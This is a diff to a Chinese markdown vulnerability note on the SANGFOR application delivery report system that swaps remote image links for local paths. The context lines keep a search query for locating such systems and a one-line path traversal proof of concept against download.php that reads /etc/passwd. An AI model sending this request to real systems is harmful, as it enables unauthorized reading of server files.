@@ -20,7 +20,7 @@ app="SANGFOR-应用交付报表系统"
 
 登录页面
 
-![image-20220525144847811](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251448956.png)
+![image-20220525144847811](./images/202205251448956.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ app="SANGFOR-应用交付报表系统"
 /report/download.php?pdf=../../../../../etc/passwd
 ```
 
-![image-20220525144958637](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251449708.png)
+![image-20220525144958637](./images/202205251449708.png)
